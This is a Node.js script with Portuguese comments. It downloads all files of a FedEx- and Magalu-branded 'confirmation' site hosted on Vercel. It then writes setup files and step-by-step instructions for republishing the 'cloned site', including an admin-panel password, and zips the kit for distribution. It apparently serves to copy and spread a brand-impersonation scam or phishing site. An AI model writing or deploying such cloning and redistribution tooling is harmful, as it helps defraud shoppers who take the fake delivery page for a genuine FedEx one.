const fs = require('fs');
const path = require('path');
const https = require('https');
const { exec } = require('child_process');
const readline = require('readline');

// Criar interface para perguntas
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Cores para o terminal
const cores = {
    verde: '\x1b[32m',
    amarelo: '\x1b[33m',
    azul: '\x1b[34m',
    vermelho: '\x1b[31m',
    reset: '\x1b[0m'
};

console.log(`${cores.azul}========================================${cores.reset}`);
console.log(`${cores.azul}   DOWNLOADER DO SITE FEDEX CONFIRMA   ${cores.reset}`);
console.log(`${cores.azul}========================================${cores.reset}\n`);

// Lista de arquivos para baixar
const arquivos = [
    // Página principal
    { url: 'https://fedexconfirma.vercel.app', nome: 'index.html', pasta: '' },
    
    // CSS
    { url: 'https://fedexconfirma.vercel.app/static/css/main.279a0c67.css', nome: 'main.279a0c67.css', pasta: 'static/css' },
    
    // JavaScript
    { url: 'https://fedexconfirma.vercel.app/static/js/main.9dcfcc1e.js', nome: 'main.9dcfcc1e.js', pasta: 'static/js' },
    
    // Imagens
    { url: 'https://fedexconfirma.vercel.app/fedex.png', nome: 'fedex.png', pasta: '' },
    { url: 'https://fedexconfirma.vercel.app/logo-magalu-azul%20(1).png', nome: 'logo-magalu-azul (1).png', pasta: '' },
    { url: 'https://fedexconfirma.vercel.app/bannerfedex.png', nome: 'bannerfedex.png', pasta: '' },
    { url: 'https://fedexconfirma.vercel.app/BANNERMAGALU.png', nome: 'BANNERMAGALU.png', pasta: '' },
    { url: 'https://fedexconfirma.vercel.app/bannerfedex2.png', nome: 'bannerfedex2.png', pasta: '' }
];

// Função para criar pastas
function criarPastas() {
    console.log(`${cores.amarelo}Criando estrutura de pastas...${cores.reset}`);
    
    const pastas = ['', 'static', 'static/css', 'static/js'];
    
    pastas.forEach(pasta => {
        if (!fs.existsSync(pasta)) {
            fs.mkdirSync(pasta, { recursive: true });
            console.log(`   📁 Pasta criada: ${pasta || 'raiz'}`);
        }
    });
    
    console.log(`${cores.verde}✅ Pastas criadas com sucesso!${cores.reset}\n`);
}

// Função para baixar arquivo
function baixarArquivo(url, destino) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(destino);
        
        https.get(url, (response) => {
            if (response.statusCode === 200) {
                response.pipe(file);
                file.on('finish', () => {
                    file.close();
                    resolve();
                });
            } else {
                reject(`Status code: ${response.statusCode}`);
            }
        }).on('error', (err) => {
            fs.unlink(destino, () => {});
            reject(err.message);
        });
    });
}

// Função para criar vercel.json
function criarVercelJson() {
    const config = {
        rewrites: [{ source: "/(.*)", destination: "/index.html" }]
    };
    
    fs.writeFileSync('vercel.json', JSON.stringify(config, null, 2));
    console.log(`${cores.verde}   📄 vercel.json criado${cores.reset}`);
}

// Função para criar .bat de teste
function criarBatTeste() {
    const conteudo = `@echo off
echo ================================
echo   TESTANDO SITE LOCALMENTE
echo ================================
echo.
echo Abrindo servidor local...
echo.
echo Pressione CTRL+C para parar o servidor
echo.
python -m http.server 8000
pause
`;
    
    fs.writeFileSync('testar.bat', conteudo);
    console.log(`${cores.verde}   📄 testar.bat criado (para testar localmente)${cores.reset}`);
}

// Função para criar arquivo de instruções
function criarInstrucoes() {
    const instrucoes = `INSTRUÇÕES PARA USAR O SITE CLONADO
====================================

📁 ESTRUTURA DE ARQUIVOS:
-------------------------
A pasta já está organizada corretamente com:
- index.html (página principal)
- static/css/ (arquivos de estilo)
- static/js/ (arquivos JavaScript)
- Todas as imagens .png

🚀 PARA TESTAR LOCALMENTE:
-------------------------
1. Dê duplo clique no arquivo "testar.bat"
2. Abra o navegador e acesse: http://localhost:8000
3. Para parar, feche a janela preta

🌐 PARA PUBLICAR NA VERCELL:
-------------------------
1. Acesse: https://vercel.com
2. Crie uma conta (pode ser com GitHub)
3. Arraste esta pasta para o site da Vercel
4. Pronto! Seu site estará online

🔗 LINKS DO SITE:
----------------
- Página inicial: / (index.html)
- Admin: /admin (senha: GT@5513)
- Rastreamento: /rastreamento/CODIGO

📦 ESTE ARQUIVO:
---------------
Você pode zipar esta pasta e enviar para quem quiser!
`;
    
    fs.writeFileSync('INSTRUCOES.txt', instrucoes);
    console.log(`${cores.verde}   📄 INSTRUCOES.txt criado${cores.reset}`);
}

// Função para criar arquivo ZIP
function criarZip() {
    console.log(`\n${cores.amarelo}Criando arquivo ZIP para enviar...${cores.reset}`);
    
    const zipNome = `fedex-clonado-${Date.now()}.zip`;
    
    // Verificar se tem 7-Zip instalado
    const comando7z = `"C:\\Program Files\\7-Zip\\7z.exe" a -tzip ${zipNome} * -x!node_modules -x!*.bat -x!*.json`;
    const comandoPowerShell = `powershell Compress-Archive -Path * -DestinationPath ${zipNome} -Force`;
    
    // Tentar com 7-Zip primeiro
    exec(comando7z, (error, stdout, stderr) => {
        if (error) {
            // Se não tiver 7-Zip, usar PowerShell
            exec(comandoPowerShell, (error2, stdout2, stderr2) => {
                if (error2) {
                    console.log(`${cores.vermelho}❌ Não foi possível criar ZIP automaticamente${cores.reset}`);
                    console.log(`   Os arquivos estão na pasta atual: ${process.cwd()}`);
                } else {
                    console.log(`${cores.verde}✅ Arquivo ZIP criado: ${zipNome}${cores.reset}`);
                }
                console.log(`\n${cores.azul}Download concluído! Arquivos prontos para enviar.${cores.reset}`);
                rl.close();
            });
        } else {
            console.log(`${cores.verde}✅ Arquivo ZIP criado: ${zipNome}${cores.reset}`);
            console.log(`\n${cores.azul}Download concluído! Arquivos prontos para enviar.${cores.reset}`);
            rl.close();
        }
    });
}

// Função principal
async function main() {
    console.log(`${cores.amarelo}Iniciando download de ${arquivos.length} arquivos...${cores.reset}\n`);
    
    // Criar pastas
    criarPastas();
    
    // Baixar arquivos
    let sucesso = 0;
    let falha = 0;
    
    for (let i = 0; i < arquivos.length; i++) {
        const arquivo = arquivos[i];
        const destino = arquivo.pasta ? path.join(arquivo.pasta, arquivo.nome) : arquivo.nome;
        
        process.stdout.write(`   [${i+1}/${arquivos.length}] Baixando: ${arquivo.nome}... `);
        
        try {
            await baixarArquivo(arquivo.url, destino);
            console.log(`${cores.verde}OK${cores.reset}`);
            sucesso++;
        } catch (err) {
            console.log(`${cores.vermelho}FALHOU${cores.reset}`);
            console.log(`        Erro: ${err}`);
            falha++;
        }
    }
    
    console.log(`\n${cores.verde}✅ Download concluído!${cores.reset}`);
    console.log(`   📥 Baixados: ${sucesso} arquivos`);
    if (falha > 0) console.log(`   ❌ Falhas: ${falha} arquivos`);
    console.log('');
    
    // Criar arquivos extras
    console.log(`${cores.amarelo}Criando arquivos adicionais...${cores.reset}`);
    criarVercelJson();
    criarBatTeste();
    criarInstrucoes();
    
    // Criar ZIP
    criarZip();
}

// Executar
main();